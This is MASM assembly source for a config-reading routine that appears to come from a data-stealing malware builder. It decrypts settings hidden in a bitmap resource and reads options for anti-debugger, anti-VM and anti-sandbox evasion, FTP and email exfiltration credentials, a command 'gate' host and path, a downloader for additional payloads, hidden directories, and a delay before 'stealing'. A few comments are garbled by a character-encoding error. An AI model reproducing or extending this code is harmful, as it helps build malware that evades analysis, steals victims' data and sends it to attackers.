read_opt proc uses ebx
  LOCAL fsz         :DWORD
  LOCAL ffs         :DWORD
  LOCAL pSharedBuf  :DWORD
  LOCAL rsrc_load   :DWORD
  LOCAL rsrc_size   :DWORD
  LOCAL hrsrc       :DWORD

      FindResource, NULL, rsrc_info0, RT_BITMAP
      .if (eax==0)
              jmp     ERRORZ
      .endif
      mov     hrsrc, eax
      SizeofResource, NULL, eax
      .if (eax==0)
              jmp     ERRORZ
      .endif
      mov     rsrc_size, eax
      LoadResource, NULL, hrsrc
      .if (eax==0)
              jmp     ERRORZ
      .endif
      mov     rsrc_load, eax
      LockResource, eax
      .if (eax==0)
              jmp     ERRORZ
      .endif
      mov     pSharedBuf, eax
      mov     edi, eax
      
      RtlMoveMemory, addr KEY, edi, sizeof KEY
      add     edi, sizeof KEY
      
      mov     eax, dword ptr [rsrc_size]
      sub     eax, 10h; + 4h
      invoke  Decrypt, edi, eax, offset KEY
      
; <Anti's>
      ; anti-dbg
      mov     al, byte ptr [edi]
      mov     byte ptr [anti_dbg], al
      inc     edi
      ; anti-vbox
      mov     al, byte ptr [edi]
      mov     byte ptr [anti_vbox], al
      inc     edi
      ; anti-ws
      mov     al, byte ptr [edi]
      mov     byte ptr [anti_ws], al
      inc     edi
      ; anti-vm
      mov     al, byte ptr [edi]
      mov     byte ptr [anti_vm], al
      inc     edi
      ; anti-anubis
      mov     al, byte ptr [edi]
      mov     byte ptr [anti_anubis], al
      inc     edi
      ; anti-sandboxie
      mov     al, byte ptr [edi]
      mov     byte ptr [anti_sbie], al
      inc     edi
      ; anti-procexp
      mov     al, byte ptr [edi]
      mov     byte ptr [anti_procexp], al
      inc     edi
      ; anti-procmon
      mov     al, byte ptr [edi]
      mov     byte ptr [anti_procmon], al
      inc     edi
      ; anti-filemon
      mov     al, byte ptr [edi]
      mov     byte ptr [anti_filemon], al
      inc     edi
      ; anti-regmon
      mov     al, byte ptr [edi]
      mov     byte ptr [anti_regmon], al
      inc     edi
      ; Exit if exe's in processes
      mov     eax, dword ptr [edi]
      add     edi, 4
      mov     anti_StructSize, eax
      test    eax, eax
      je      NoAntiToday
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, anti_StructSize
      .if     (eax==0)
              jmp     ERRORZ
      .endif       
      mov     anti_hStruct, eax
      RtlMoveMemory, anti_hStruct, edi, anti_StructSize
      add     edi, dword ptr [anti_StructSize]
NoAntiToday:
      ; Check anti's right now
      pushad
      call    CheckAntis
      test    eax, eax
      je      FatalError
      popad
; </Anti's>
      
; <FTP Data>
      mov     ebx, dword ptr [edi]
      add     edi, 4
      test    ebx, ebx
      je      No_FTP_Today
      RtlMoveMemory, addr FTP_HOST, edi, ebx
      add     edi, ebx
      mov     ebx, dword ptr [edi]
      add     edi, 4
      RtlMoveMemory, addr FTP_LOGIN, edi, ebx
      add     edi, ebx
      mov     ebx, dword ptr [edi]
      add     edi, 4
      RtlMoveMemory, addr FTP_PWD, edi, ebx
      add     edi, ebx
      RtlMoveMemory, addr P_MODE, edi, sizeof P_MODE
      add     edi, sizeof P_MODE
No_FTP_Today:
; </FTP Data>

; <Mail Data>
      mov     ebx, dword ptr [edi]
      add     edi, 4
      test    ebx, ebx
      je      No_mail_Today
      RtlMoveMemory, addr mail_from, edi, ebx
      add     edi, ebx
      mov     ebx, dword ptr [edi]
      add     edi, 4
      RtlMoveMemory, addr mail_to, edi, ebx
      add     edi, ebx
      mov     ebx, dword ptr [edi]
      add     edi, 4
      RtlMoveMemory, addr mail_login, edi, ebx
      add     edi, ebx
      mov     ebx, dword ptr [edi]
      add     edi, 4
      RtlMoveMemory, addr mail_pwd, edi, ebx
      add     edi, ebx
      mov     ebx, dword ptr [edi]
      add     edi, 4
      RtlMoveMemory, addr mail_server, edi, ebx
      add     edi, ebx
      RtlMoveMemory, addr mail_port, edi, sizeof mail_port
      add     edi, sizeof mail_port
No_mail_Today:
; </Mail Data>

; <Pwd Protecting Data>
      RtlMoveMemory, addr PwdKeySize, edi, sizeof PwdKeySize
      add     edi, sizeof PwdKeySize
      mov     eax, dword ptr [PwdKeySize]
      .if     eax > 0
              HeapAlloc, hHeap, HEAP_ZERO_MEMORY, PwdKeySize
              .if     eax == 0
                      jmp     ERRORZ
              .endif
              mov     dword ptr [hPwdKeyMem], eax
              RtlMoveMemory, hPwdKeyMem, edi, PwdKeySize
              add     edi, dword ptr [PwdKeySize]
      .endif
; </Pwd Protecting Data>
      
; <Grab Outer IP>
      RtlMoveMemory, addr GrabOuterIP, edi, sizeof GrabOuterIP
      add     edi, sizeof GrabOuterIP
; </Grab Outer IP>
      
; <Flash Use Create Dir Name>
      mov     eax, dword ptr [edi]
      add     edi, 4
      mov     DirNameCreateLen, eax
      test    eax, eax
      je      NoDirCreateNameToday
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, DirNameCreateLen
      .if     (eax==0)
              jmp     ERRORZ
      .endif       
      mov     hDirNameCreate, eax
      RtlMoveMemory, hDirNameCreate, edi, DirNameCreateLen
      add     edi, dword ptr [DirNameCreateLen]
NoDirCreateNameToday:
; </Flash Use Create Dir Name>

; <��������� ������ ��� ������� ������>
      mov     eax, dword ptr [edi]
      add     edi, 4
      mov     dword ptr [DropFC], eax
      test    eax, eax
      je      NoRunToday
      
      mov     eax, dword ptr [edi]
      add     edi, 4
      mov     dword ptr [DropRunStyle], eax
      
      mov     eax, dword ptr [edi]
      add     edi, 4
      mov     dword ptr [DropStructSize], eax
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, DropStructSize
      .if     (eax==0)
              jmp     ERRORZ
      .endif       
      mov     hDropStruct, eax
      RtlMoveMemory, hDropStruct, edi, DropStructSize
      add     edi, dword ptr [DropStructSize]
NoRunToday:
; </��������� ������ ��� ������� ������>

; <Ftp Use Create Dir Name>
      mov     eax, dword ptr [edi]
      add     edi, 4
      mov     FtpDirNameCreateLen, eax
      test    eax, eax
      je      NoFtpDirCreateNameToday
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, FtpDirNameCreateLen
      .if     (eax==0)
              jmp     ERRORZ
      .endif       
      mov     hFtpDirNameCreate, eax
      RtlMoveMemory, hFtpDirNameCreate, edi, FtpDirNameCreateLen
      add     edi, dword ptr [FtpDirNameCreateLen]
NoFtpDirCreateNameToday:
; </Ftp Use Create Dir Name>
      
; <Gate Host>
      mov     eax, dword ptr [edi]
      add     edi, 4
      mov     GateHostSize, eax
      test    eax, eax
      je      NoGateHostToday
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, GateHostSize
      .if     (eax==0)
              jmp     ERRORZ
      .endif       
      mov     hGateHost, eax
      RtlMoveMemory, hGateHost, edi, GateHostSize
      add     edi, dword ptr [GateHostSize]
NoGateHostToday:
; </Gate Host>

; <Gate Path>
      mov     eax, dword ptr [edi]
      add     edi, 4
      mov     GatePathSize, eax
      test    eax, eax
      je      NoGatePathToday
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, GatePathSize
      .if     (eax==0)
              jmp     ERRORZ
      .endif       
      mov     hGatePath, eax
      RtlMoveMemory, hGatePath, edi, GatePathSize
      add     edi, dword ptr [GatePathSize]
NoGatePathToday:
; </Gate Path>

; <Dloader>
      ; Dloader files
      mov     eax, dword ptr [edi]
      add     edi, 4
      mov     dloader_StructSize, eax
      test    eax, eax
      je      NoDloaderToday
      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, dloader_StructSize
      .if     (eax==0)
              jmp     ERRORZ
      .endif       
      mov     dloader_hStruct, eax
      RtlMoveMemory, dloader_hStruct, edi, dloader_StructSize
      add     edi, dword ptr [dloader_StructSize]
NoDloaderToday:
; </Dloader>
      
      RtlMoveMemory, addr DirHide, edi, 3                  ; ZZZZZZZZZZZZ
      add     edi, 3                                       ; ZZZZZZZZZZZZ
      
; <Sleep before stealing>
      RtlMoveMemory, addr SleepTimeMs, edi, sizeof SleepTimeMs
      add     edi, sizeof SleepTimeMs
; </Sleep before stealing>

      FreeResource, rsrc_load
      ret                                       
read_opt endp
